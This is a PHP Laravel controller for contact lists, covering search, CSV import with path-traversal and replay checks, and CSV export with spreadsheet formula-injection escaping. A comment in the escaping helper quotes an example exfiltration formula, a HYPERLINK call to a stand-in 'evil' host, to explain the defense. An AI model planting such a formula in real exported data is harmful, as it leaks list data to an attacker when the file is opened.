<?php

namespace App\Http\Controllers;

use App\Models\Contact;
use App\Models\ContactList;
use App\Services\CsvStreamService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\StreamedResponse;

class ContactController extends Controller
{
    public function index()
    {
        $user = Auth::user();
        $lists = ContactList::where('user_id', $user->id)
            ->withCount(['contacts'])
            ->latest()
            ->get();

        return view('contacts.index', compact('lists'));
    }

    public function storeList(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|max:255',
            'description' => 'nullable|string|max:1000',
        ]);

        $validated['user_id'] = Auth::id();
        ContactList::create($validated);

        return redirect()->route('contacts.index')->with('success', 'Contact list created successfully.');
    }

    public function show(Request $request, ContactList $list)
    {
        if ($list->user_id !== Auth::id()) {
            abort(403);
        }

        $query = $list->contacts();

        if ($search = $request->query('search')) {
            $needle = '%'.self::escapeLike($search).'%';

            $query->where(function ($q) use ($needle) {
                $q->where('email', 'like', $needle)
                    ->orWhere('first_name', 'like', $needle)
                    ->orWhere('last_name', 'like', $needle)
                    ->orWhere('company', 'like', $needle);
            });
        }

        $contacts = $query->latest()->paginate(25)->withQueryString();

        return view('contacts.show', compact('list', 'contacts'));
    }

    public function storeContact(Request $request, ContactList $list)
    {
        if ($list->user_id !== Auth::id()) {
            abort(403);
        }

        $validated = $request->validate([
            'email' => 'required|email|max:255',
            'first_name' => 'nullable|string|max:255',
            'last_name' => 'nullable|string|max:255',
            'company' => 'nullable|string|max:255',
        ]);

        $contact = $list->contacts()->updateOrCreate(
            ['email' => strtolower($validated['email'])],
            [
                'first_name' => $validated['first_name'] ?? null,
                'last_name' => $validated['last_name'] ?? null,
                'company' => $validated['company'] ?? null,
                'status' => 'active',
            ]
        );

        $list->update(['total_contacts' => $list->contacts()->count()]);

        return back()->with('success', 'Contact saved successfully.');
    }

    public function uploadCsvPreview(Request $request, CsvStreamService $csvService)
    {
        $request->validate([
            // 200MB limit. The extension/MIME pair is checked too — the importer
            // only ever reads delimited text, so nothing else should be stored.
            'csv_file' => 'required|file|max:204800|mimes:csv,txt|mimetypes:text/csv,text/plain,application/csv,application/vnd.ms-excel',
        ]);

        $file = $request->file('csv_file');
        $filename = uniqid('csv_', true).'.csv';
        $tempPath = $file->storeAs('csv_temp', $filename, 'local');
        $fullPath = Storage::disk('local')->path($tempPath);

        try {
            $inspection = $csvService->inspectHeaders($fullPath);

            // Register the upload against this user so the import step can resolve the
            // real path server-side instead of trusting whatever the client sends back.
            Cache::put($this->csvImportCacheKey($filename), true, now()->addHours(2));

            return response()->json([
                'success' => true,
                'temp_file_path' => $filename,
                'headers' => $inspection['headers'],
                'sample_rows' => $inspection['sample_rows'],
                'auto_mapping' => $inspection['auto_mapping'],
            ]);
        } catch (\Exception $e) {
            @unlink($fullPath);

            return response()->json(['success' => false, 'message' => $e->getMessage()], 422);
        }
    }

    public function processCsvImport(Request $request, CsvStreamService $csvService)
    {
        $validated = $request->validate([
            'contact_list_id' => 'required|exists:contact_lists,id',
            'temp_file_path' => 'required|string',
            'column_map' => 'required|array',
        ]);

        $list = ContactList::where('id', $validated['contact_list_id'])
            ->where('user_id', Auth::id())
            ->firstOrFail();

        $fullPath = $this->resolveCsvUploadPath($validated['temp_file_path']);
        if ($fullPath === null) {
            return response()->json([
                'success' => false,
                'message' => 'Upload session expired or invalid. Please re-upload the CSV file.',
            ], 422);
        }

        try {
            $result = $csvService->streamImport(
                $fullPath,
                $list->id,
                $validated['column_map'],
                (int) $list->user_id
            );

            return response()->json([
                'success' => true,
                'message' => "Successfully imported {$result['imported_count']} contacts! Total active in list: {$result['actual_total']}.",
                'details' => $result,
            ]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    /**
     * Cache key tying a temp CSV upload to the user that uploaded it.
     */
    private function csvImportCacheKey(string $filename): string
    {
        return 'csv_import_token:'.Auth::id().':'.$filename;
    }

    /**
     * Turn the client-supplied upload reference back into a real path. Returns null
     * unless it is a bare filename, was uploaded by this user, and still resolves
     * inside the csv_temp directory.
     */
    private function resolveCsvUploadPath(string $reference): ?string
    {
        $filename = basename($reference);
        if ($filename !== $reference) {
            return null;
        }

        // pull() = single use, so an upload reference cannot be replayed.
        if (! Cache::pull($this->csvImportCacheKey($filename))) {
            return null;
        }

        $tempDir = realpath(Storage::disk('local')->path('csv_temp'));
        $fullPath = realpath(Storage::disk('local')->path('csv_temp/'.$filename));

        if ($tempDir === false || $fullPath === false || ! str_starts_with($fullPath, $tempDir.DIRECTORY_SEPARATOR)) {
            return null;
        }

        return $fullPath;
    }

    public function exportCsv(ContactList $list)
    {
        if ($list->user_id !== Auth::id()) {
            abort(403);
        }

        $headers = [
            'Content-type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename=contact_list_'.$list->id.'_'.date('Ymd_His').'.csv',
            'Pragma' => 'no-cache',
            'Cache-Control' => 'must-revalidate, post-check=0, pre-check=0',
            'Expires' => '0',
        ];

        return new StreamedResponse(function () use ($list) {
            $handle = fopen('php://output', 'w');
            fputcsv($handle, ['Email', 'First Name', 'Last Name', 'Company', 'Status', 'Date Added']);

            $list->contacts()->chunkById(1000, function ($contacts) use ($handle) {
                foreach ($contacts as $c) {
                    fputcsv($handle, array_map([self::class, 'neutralizeCsvValue'], [
                        $c->email,
                        $c->first_name,
                        $c->last_name,
                        $c->company,
                        $c->status,
                        $c->created_at?->format('Y-m-d H:i:s'),
                    ]));
                }
            });

            fclose($handle);
        }, 200, $headers);
    }

    /**
     * Defuses spreadsheet formula injection.
     *
     * Contact names and companies are attacker-supplied (via CSV import or the
     * add-contact form). A cell starting `=`, `+`, `-`, `@`, tab or CR is
     * executed as a formula when the export is opened in Excel or Sheets, so
     * `=HYPERLINK("https://evil/?d="&A1)` would exfiltrate the list. Prefixing
     * an apostrophe forces the cell to be read as text; the stored data is
     * untouched, only the export is escaped.
     */
    protected static function neutralizeCsvValue(mixed $value): string
    {
        $value = (string) $value;

        if ($value !== '' && str_contains("=+-@\t\r", $value[0])) {
            return "'".$value;
        }

        return $value;
    }

    public function destroyContact(Contact $contact)
    {
        if ($contact->contactList->user_id !== Auth::id()) {
            abort(403);
        }

        $list = $contact->contactList;
        $contact->delete();
        $list->update(['total_contacts' => $list->contacts()->count()]);

        return back()->with('success', 'Contact removed.');
    }

    public function destroyList(ContactList $list)
    {
        if ($list->user_id !== Auth::id()) {
            abort(403);
        }

        $list->delete();

        return redirect()->route('contacts.index')->with('success', 'Contact list and all associated contacts deleted.');
    }
}
